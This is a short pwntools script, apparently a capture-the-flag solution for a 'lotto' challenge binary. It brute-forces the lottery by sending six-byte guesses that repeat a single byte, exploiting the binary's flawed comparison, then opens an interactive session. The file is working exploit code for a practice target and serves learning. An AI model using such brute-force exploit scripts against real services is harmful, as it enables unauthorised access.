#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
context.log_level = 'debug'

io = process('./lotto')

for i in range(46):

	my_byte = chr(i)*6
	io.sendline('1')
	io.sendlineafter(": ",my_byte)
	a = io.recvline()
	if a != "Lotto Start!\n":
		break
io.interactive()

